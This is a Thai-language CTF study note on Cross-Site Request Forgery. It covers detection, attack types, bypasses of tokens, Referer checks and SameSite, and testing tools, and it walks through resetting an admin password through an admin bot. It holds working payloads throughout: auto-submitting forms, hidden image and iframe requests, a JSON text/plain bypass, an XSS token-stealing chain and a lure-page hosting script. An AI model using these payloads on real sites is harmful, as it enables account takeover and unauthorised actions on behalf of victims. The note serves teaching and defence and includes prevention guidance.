# CSRF (Cross-Site Request Forgery)

## ❓ What

**Cross-Site Request Forgery (CSRF)** คือช่องโหว่ที่ทำให้ผู้โจมตีสามารถหลอกให้ผู้ใช้งานที่ authenticated อยู่แล้วทำการส่ง request ที่ไม่ได้ตั้งใจไปยัง web application โดยที่ผู้ใช้ไม่รู้ตัว

### How It Works

CSRF ทำงานโดยการใช้ประโยชน์จาก trust ที่ web application มีต่อ browser ของผู้ใช้ เมื่อผู้ใช้ login เข้าสู่ระบบ session cookie จะถูกเก็บไว้ใน browser และจะถูกส่งไปกับทุก request โดยอัตโนมัติ

ผู้โจมตีสามารถสร้าง malicious page หรือ email ที่มี hidden request ซึ่งเมื่อผู้ใช้เข้าชม browser จะส่ง request พร้อมกับ session cookie ไปยัง target application โดยอัตโนมัติ

### CTF Relevance

ใน CTF challenges, CSRF มักจะเกี่ยวข้องกับ:
- การเปลี่ยน password ของ admin
- การทำ privileged actions โดยไม่ได้รับอนุญาต
- การ bypass CSRF protection mechanisms
- การ chain กับช่องโหว่อื่นๆ เช่น [[XSS]] หรือ [[Open Redirect]]

> [!info] Key Concept
> CSRF ต่างจาก XSS ตรงที่ CSRF ไม่สามารถขอ response กลับมาได้ แต่สามารถส่ง request ไปทำ action ต่างๆ ได้เท่านั้น

---

## 🔍 Landmark (Detection)

### Signs of CSRF Vulnerability

1. **No CSRF Token**: Form ไม่มี anti-CSRF token
2. **Predictable Tokens**: Token ที่สามารถเดาได้หรือ reuse ได้
3. **GET Request for State-Changing Operations**: ใช้ GET แทน POST สำหรับ actions ที่เปลี่ยนแปลง state
4. **Missing SameSite Cookie Attribute**: Cookie ไม่มี SameSite attribute
5. **Referer Header Not Checked**: Application ไม่ validate Referer header

### Detection Methods

```python
# Script สำหรับตรวจสอบ CSRF protection
import requests
from bs4 import BeautifulSoup

def check_csrf_protection(target_url, session_cookie):
    """
    ตรวจสอบว่า form มี CSRF token หรือไม่
    """
    response = requests.get(target_url, cookies=session_cookie)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    forms = soup.find_all('form')
    vulnerable_forms = []
    
    for form in forms:
        # ค้นหา CSRF token fields ทั่วไป
        csrf_fields = form.find_all('input', attrs={
            'name': ['csrf_token', 'csrfmiddlewaretoken', '_token', 'authenticity_token']
        })
        
        if not csrf_fields:
            action = form.get('action', 'N/A')
            method = form.get('method', 'GET')
            vulnerable_forms.append({'action': action, 'method': method})
    
    return vulnerable_forms

# ตัวอย่างการใช้งาน
target = "https://target.com/profile/edit"
cookies = {'session': 'user_session_token'}
vulns = check_csrf_protection(target, cookies)
print(f"Found {len(vulns)} potentially vulnerable forms")
```

### Burp Suite Detection

ใน [[Burp Suite]], สามารถใช้:
- **Engagement Tools > Generate CSRF PoC**: สร้าง proof-of-concept อัตโนมัติ
- **Scanner**: ตรวจหา CSRF vulnerability อัตโนมัติ
- **Repeater**: ทดสอบการส่ง request โดยไม่มี token

---

## 🟦 Types

### 1. GET-based CSRF

CSRF ที่ใช้ GET request เป็นวิธีที่ง่ายที่สุด

```html
<!-- แค่โหลด image ก็ทำให้เกิด request -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

<!-- หรือใช้ iframe -->
<iframe src="https://bank.com/delete_account?confirm=yes" style="display:none"></iframe>
```

### 2. POST-based CSRF

CSRF ที่ใช้ POST request ต้องใช้ form submission

```html
<html>
<body>
  <form id="csrf-form" action="https://target.com/api/change_email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="true">
  </form>
  
  <script>
    // Auto-submit เมื่อโหลดหน้า
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

### 3. JSON-based CSRF

CSRF สำหรับ API ที่รับ JSON payload

```html
<script>
// ใช้ form with enctype เพื่อ bypass CORS
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://api.target.com/user/update';
form.enctype = 'text/plain';

var input = document.createElement('input');
input.name = '{"email":"attacker@evil.com","role":"admin","x":"';
input.value = 'y"}';
form.appendChild(input);

document.body.appendChild(form);
form.submit();
</script>
```

### 4. XSS-based CSRF

Chain [[XSS]] กับ CSRF เพื่อ bypass protections

```javascript
// Stored XSS payload ที่ทำ CSRF
fetch('/admin/delete_user', {
  method: 'POST',
  credentials: 'include', // ส่ง cookie ไปด้วย
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': extractTokenFromPage() // อ่าน token จากหน้าเว็บปัจจุบัน
  },
  body: JSON.stringify({user_id: 1})
});
```

---

## 🔨 Exploitation

### CSRF Token Validation

CSRF token เป็น defense mechanism หลัก มี implementation patterns ต่างๆ:

1. **Synchronizer Token Pattern**: Token ถูกเก็บใน session และต้อง match กับ token ที่ส่งมาใน request
2. **Double Submit Cookie**: Token ถูกเก็บทั้งใน cookie และใน request parameter แล้วเปรียบเทียบกัน
3. **Encrypted Token**: Token ที่ถูก encrypt เพื่อป้องกันการ tamper

### SameSite Cookie Attribute

```http
Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=None; Secure
```

- **Strict**: Cookie จะไม่ถูกส่งในทุก cross-site request
- **Lax**: Cookie จะถูกส่งเฉพาะ top-level navigation (GET)
- **None**: Cookie จะถูกส่งในทุก request (ต้องมี Secure flag)

### POC Generation

```python
#!/usr/bin/env python3
"""
CSRF POC Generator
สร้าง HTML proof-of-concept สำหรับ CSRF attack
"""

def generate_csrf_poc(url, method, params, auto_submit=True):
    """
    สร้าง CSRF POC HTML
    
    Args:
        url: Target URL
        method: HTTP method (GET/POST)
        params: Dictionary ของ parameters
        auto_submit: Auto-submit form หรือไม่
    """
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>Target: {url}</p>
    
    <form id="csrf-form" action="{url}" method="{method}">
"""
    
    # เพิ่ม hidden fields สำหรับแต่ละ parameter
    for key, value in params.items():
        html += f'        <input type="hidden" name="{key}" value="{value}">\n'
    
    html += """        <input type="submit" value="Submit Request">
    </form>
"""
    
    # เพิ่ม auto-submit script ถ้าต้องการ
    if auto_submit:
        html += """    
    <script>
        // Auto-submit เมื่อโหลดหน้า
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        }
    </script>
"""
    
    html += """</body>
</html>"""
    
    return html

# ตัวอย่างการใช้งาน
poc = generate_csrf_poc(
    url="https://target.com/api/change_password",
    method="POST",
    params={
        "new_password": "hacked123",
        "confirm_password": "hacked123"
    },
    auto_submit=True
)

with open("csrf_poc.html", "w") as f:
    f.write(poc)
    
print("[+] CSRF PoC generated: csrf_poc.html")
```

> [!warning] Testing Warning
> ทดสอบ CSRF เฉพาะบน application ที่ได้รับอนุญาตเท่านั้น การทำ CSRF attack บนระบบจริงโดยไม่ได้รับอนุญาตถือเป็นการกระทำผิดกฎหมาย

---

## 🚪 Bypass Techniques

### 1. Token Validation Bypass

#### Missing Token Validation

บาง application ไม่ validate token ถ้าไม่มี token ใน request

```http
POST /api/change_email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=valid_session

email=attacker@evil.com
```

ลองส่ง request โดยไม่มี `csrf_token` parameter เลย

#### Token Not Tied to User Session

Token ที่ไม่ได้ผูกกับ user session สามารถใช้ token ของ attacker เองได้

```html
<form action="https://target.com/change_email" method="POST">
    <input type="hidden" name="csrf_token" value="attacker_valid_token">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
```

#### Token Validation Only on POST

ถ้า application validate token เฉพาะ POST แต่ยอมรับ GET ด้วย

```html
<img src="https://target.com/change_email?email=attacker@evil.com&_method=POST">
```

### 2. Referer Header Bypass

#### Missing Referer Bypass

ถ้า application ตรวจสอบ Referer แต่ยอมรับ request ที่ไม่มี Referer

```html
<meta name="referrer" content="no-referrer">
<form action="https://target.com/api/action" method="POST">
    <!-- form fields -->
</form>
```

#### Partial Referer Validation

Application ที่ตรวจสอบแค่บางส่วนของ Referer สามารถ bypass ได้ด้วย subdomain หรือ path

```
https://target.com.attacker.com/csrf.html
https://attacker.com/target.com/csrf.html
```

### 3. SameSite Cookie Bypass

#### SameSite=Lax Bypass with GET

SameSite=Lax ยังอนุญาต GET requests จาก cross-site

```html
<a href="https://target.com/api/delete?id=123">Click here for free prize!</a>
```

#### SameSite=None without Secure

Cookie ที่มี SameSite=None แต่ไม่มี Secure flag จะถูกส่งใน HTTP requests

### 4. Content-Type Bypass

#### Simple Request Exploitation

ใช้ content-type ที่ไม่ trigger preflight request

```javascript
// application/json จะ trigger preflight
// แต่ text/plain ไม่จะไม่ trigger
fetch('https://target.com/api/update', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'text/plain'
    },
    body: '{"email":"attacker@evil.com"}'
});
```

### 5. JSON Encoding Bypass

สำหรับ API ที่รับ JSON แต่ไม่ validate Content-Type อย่างเคร่งครัด

```html
<form action="https://api.target.com/user/update" method="POST" enctype="text/plain">
    <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

Result payload:
```json
{"email":"attacker@evil.com","ignore":"="}
```

### 6. Token Reuse and Prediction

```python
# ทดสอบว่า token สามารถ reuse ได้หรือไม่
import requests

session = requests.Session()

# Get token ครั้งแรก
resp1 = session.get("https://target.com/form")
token1 = extract_token(resp1.text)

# ทำ action ด้วย token นี้
session.post("https://target.com/action", data={"csrf_token": token1})

# ลอง reuse token เดิมอีกครั้ง
resp2 = session.post("https://target.com/action", data={"csrf_token": token1})

if resp2.status_code == 200:
    print("[!] Token can be reused!")
```

---

## 🛠️ Tool

### Primary Tools

- **[[Burp Suite]]**: Generate CSRF PoC, intercept requests, modify tokens
- **CSRF PoC Generator**: Browser extension สำหรับสร้าง PoC อัตโนมัติ
- **curl**: ทดสอบ requests แบบ manual
- **Python requests**: เขียน script สำหรับ automated testing

### Burp Suite Workflow

1. **Intercept Request**: จับ request ที่ต้องการทดสอบ
2. **Right-click > Engagement Tools > Generate CSRF PoC**: สร้าง HTML PoC
3. **Test PoC**: บันทึกเป็น HTML file และเปิดใน browser
4. **Analyze Response**: ดู response ว่า action สำเร็จหรือไม่

### Custom Tools

```python
#!/usr/bin/env python3
"""
CSRF Token Extractor and Tester
ดึง CSRF token และทดสอบการ bypass ต่างๆ
"""
import re
import requests
from urllib.parse import urljoin

class CSRFTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.update(session_cookie)
    
    def extract_token(self, html_content):
        """
        ดึง CSRF token จาก HTML
        """
        patterns = [
            r'name="csrf_token" value="([^"]+)"',
            r'name="_token" value="([^"]+)"',
            r'name="csrfmiddlewaretoken" value="([^"]+)"',
            r'<meta name="csrf-token" content="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        return None
    
    def test_missing_token(self, endpoint, data):
        """
        ทดสอบส่ง request โดยไม่มี token
        """
        # ลบ csrf token ออกจาก data
        data_without_token = {k: v for k, v in data.items() 
                             if 'csrf' not in k.lower() and '_token' not in k.lower()}
        
        response = self.session.post(
            urljoin(self.base_url, endpoint),
            data=data_without_token
        )
        return response.status_code == 200
    
    def test_token_reuse(self, endpoint, token, data):
        """
        ทดสอบการ reuse token
        """
        # ใช้ token เดิมหลายครั้ง
        for i in range(3):
            data_with_token = data.copy()
            data_with_token['csrf_token'] = token
            response = self.session.post(
                urljoin(self.base_url, endpoint),
                data=data_with_token
            )
            if response.status_code != 200:
                return False
        return True
    
    def test_method_override(self, endpoint, data):
        """
        ทดสอบ GET request แทน POST
        """
        response = self.session.get(
            urljoin(self.base_url, endpoint),
            params=data
        )
        return response.status_code == 200

# การใช้งาน
tester = CSRFTester("https://target.com", {"session": "user_session"})
print("[*] Testing CSRF protections...")
```

---

## 💡 Related

- **[[🌐 Web application]]**: CSRF เป็นช่องโหว่ใน web applications
- **[[XSS]]**: สามารถ chain กับ CSRF เพื่อ bypass protections
- **[[Authentication]]**: CSRF โจมตี authenticated sessions
- **[[Session Management]]**: เกี่ยวข้องกับการจัดการ session cookies
- **[[CORS]]**: Cross-Origin Resource Sharing มีผลต่อ CSRF attacks

> [!tip] Defense Checklist
> - ใช้ CSRF tokens ทุก state-changing operations
> - Set SameSite attribute บน cookies
> - Validate Origin/Referer headers
> - ใช้ POST สำหรับ sensitive actions
> - Require re-authentication สำหรับ critical actions

---

## 📚 Example

### CTF Challenge: Admin Password Reset

**Scenario**: มี web application ที่มีช่องโหว่ CSRF ใน password reset function ของ admin

#### Step 1: Reconnaissance

เข้าสู่ระบบด้วย user ธรรมดาและตรวจสอบ password change functionality

```bash
# ดู profile page
curl -H "Cookie: session=user_token" https://target.ctf.com/profile

# ตรวจสอบ password change form
curl -H "Cookie: session=user_token" https://target.ctf.com/change_password
```

พบว่า form มี structure ดังนี้:

```html
<form action="/change_password" method="POST">
    <input type="password" name="new_password" placeholder="New Password">
    <input type="password" name="confirm_password" placeholder="Confirm Password">
    <input type="submit" value="Change Password">
</form>
```

**สังเกต**: ไม่มี CSRF token!

#### Step 2: Testing with Own Account

ทดสอบ CSRF โดยสร้าง PoC HTML และเปลี่ยน password ของตัวเอง

```html
<!-- csrf_test.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Test</title>
</head>
<body>
    <h1>Testing CSRF</h1>
    <form id="csrf-form" action="https://target.ctf.com/change_password" method="POST">
        <input type="hidden" name="new_password" value="test123">
        <input type="hidden" name="confirm_password" value="test123">
    </form>
    
    <script>
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

เปิดไฟล์นี้ใน browser ที่ login อยู่แล้ว → Password เปลี่ยนสำเร็จ!

#### Step 3: Admin Bot Interaction

ใน CTF นี้มี admin bot ที่จะเข้าเยี่ยมชม URL ที่เรา submit

```python
#!/usr/bin/env python3
"""
Host CSRF exploit และ submit ไปให้ admin bot
"""
from http.server import HTTPServer, SimpleHTTPRequestHandler
import requests
import threading

# สร้าง CSRF payload สำหรับ admin
csrf_payload = """<!DOCTYPE html>
<html>
<head>
    <title>Congratulations!</title>
</head>
<body>
    <h1>You Won a Prize!</h1>
    <p>Loading your reward...</p>
    
    <form id="csrf-form" action="https://target.ctf.com/change_password" method="POST">
        <input type="hidden" name="new_password" value="hacked123">
        <input type="hidden" name="confirm_password" value="hacked123">
    </form>
    
    <script>
        // Auto-submit เมื่อ admin เข้าชม
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        }
    </script>
</body>
</html>"""

# บันทึก payload
with open('index.html', 'w') as f:
    f.write(csrf_payload)

# Start HTTP server
def start_server():
    server = HTTPServer(('0.0.0.0', 8000), SimpleHTTPRequestHandler)
    print("[+] Server started on port 8000")
    server.serve_forever()

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

# Submit URL ไปให้ admin bot
print("[*] Submitting URL to admin bot...")
bot_url = "https://target.ctf.com/report"
payload = {
    "url": "http://YOUR_IP:8000/index.html"
}

response = requests.post(bot_url, json=payload)
if response.status_code == 200:
    print("[+] URL submitted successfully!")
    print("[*] Waiting for admin to visit...")
else:
    print("[-] Failed to submit URL")

# รอให้ admin เข้าชม
input("Press Enter when admin has visited...")
```

#### Step 4: Login as Admin

หลังจาก admin bot เข้าชม URL ของเรา, password ของ admin จะถูกเปลี่ยนเป็น `hacked123`

```bash
# ลอง login ด้วย admin credentials
curl -X POST https://target.ctf.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=hacked123" \
  -c cookies.txt

# เข้าถึง admin panel
curl -b cookies.txt https://target.ctf.com/admin
```

#### Step 5: Capture the Flag

```bash
# ดึง flag จาก admin panel
curl -b cookies.txt https://target.ctf.com/admin/flag

# Output:
# CTF{csrf_4tt4ck_0n_4dm1n_p4ss_r3s3t}
```

### Key Takeaways

1. **No CSRF Protection**: Application ไม่มี CSRF token ทำให้เกิดช่องโหว่
2. **Admin Bot**: CTF challenges มักมี admin bot ที่จำลอง victim
3. **State-Changing via POST**: แม้จะใช้ POST แต่ถ้าไม่มี token ก็ยัง vulnerable
4. **Auto-Submit Form**: JavaScript auto-submit ทำให้ attack ทำงานโดยอัตโนมัติ

### Alternative Solution: XSS Chain

ถ้า application มี CSRF token แต่มีช่องโหว่ [[XSS]], สามารถ chain attacks ได้:

```javascript
// Stored XSS payload ที่ extract token และทำ CSRF
fetch('/change_password_form')
  .then(response => response.text())
  .then(html => {
    // Extract CSRF token จาก form
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const token = doc.querySelector('input[name="csrf_token"]').value;
    
    // ส่ง request พร้อม valid token
    return fetch('/change_password', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `csrf_token=${token}&new_password=hacked123&confirm_password=hacked123`
    });
  })
  .then(() => console.log('Password changed!'));
```

### Prevention Tips (จาก challenge นี้)

- ✅ ใช้ CSRF tokens สำหรับทุก state-changing operations
- ✅ Validate token ทุก request
- ✅ Bind token กับ user session
- ✅ Set `SameSite=Strict` หรือ `SameSite=Lax` บน session cookies
- ✅ ตรวจสอบ Origin/Referer headers
- ✅ Require password confirmation สำหรับ sensitive actions

---

## 🔗 Resources

- OWASP CSRF Prevention Cheat Sheet
- PortSwigger Web Security Academy - CSRF
- CWE-352: Cross-Site Request Forgery
- [[🌐 Web application]] security fundamentals
- [[Burp Suite]] CSRF testing guide
